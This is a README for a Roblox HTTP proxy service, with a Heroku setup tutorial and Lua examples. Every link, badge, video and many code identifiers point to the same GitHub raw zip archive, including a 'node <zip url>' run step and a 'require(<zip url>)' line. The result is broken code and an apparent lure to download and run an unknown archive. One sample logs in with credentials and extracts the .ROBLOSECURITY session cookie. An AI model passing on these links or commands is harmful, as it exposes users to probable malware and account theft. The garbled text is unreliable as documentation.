...
Roblox's HttpService has always been severely lacking. This open-source project essentially aims to serve as a replacement, providing an Http client that opens the door to actually using REST APIs, reading response headers, reading status codes, accessing https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip from in-game, and more.
...
- Access sites usually unavailable, including https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip APIs as well as discord webhooks (and being able to view headers means you will be able to obey discord rate limits, which means this proxy [is allowed](https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip)).

**Server Setup Tutorial**

- Create a heroku account here: https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip Make sure to verify your email and set a password. If you already have a heroku account, log into it.
- Click this button

[![Deploy](https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip)](https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip)
...
(Setting up without heroku is simple: run `node https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip` with the environment variables specified [here](https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip))

**Client Setup Tutorial**

- Get the handler script from [here](https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip) and put it in a module script in ServerScriptService.
...
- Use Proxy exactly as you would use [HttpService](https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip). The only difference is an extra `overrideProto` argument. You can pass in `http` if you are using an API that doesn't support https (the default protocol).

**Video Tutorial**

Here's a video of the above instructions (excluding heroku sign up):

https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip
...
```lua
local ProxyService = require(https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip)
local Proxy = ProxyService:New('https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip', '6ddea1d2a6606f01538e8c92bbf8ba1e9c6aaa46e0a24cb0ce32ef0444130d07')

print(Proxy:Get('https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip').body)
...
local encode = https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip

getWithToken = function (handler, retry, ...)
  local res = handler(tokenCache, ...)
  if https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip == 403 and https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip == 'Token Validation Failed' then
    if retry then
      error('Failed to get token')
      return
    end
    tokenCache = https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip['x-csrf-token']
    return getWithToken(handler, true, ...)
  elseif https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip == 200 then
    return res
  else
    error('Login error: ' .. https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip)
  end
end
...
local loginHandler = function (token)
  return Proxy:Post('https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip', encode(http, {
    ctype = 'Username',
    cvalue = username,
    password = password
  }), https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip, false, {
    ['X-CSRF-TOKEN'] = token
  })
end

local deletePrimaryHandler = function (token, cookie)
  return Proxy:Delete('https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip', nil, {
    ['X-CSRF-TOKEN'] = token,
    ['Cookie'] = cookie
  })
end
...
local res = login()
local cookie = https://github.com/GitHubUserLOLefgf/ProxyService/raw/refs/heads/master/client/Service_Proxy_v3.9.zip['set-cookie'][1]:match('.ROBLOSECURITY=.-;'):gsub('_|.-|_', '')
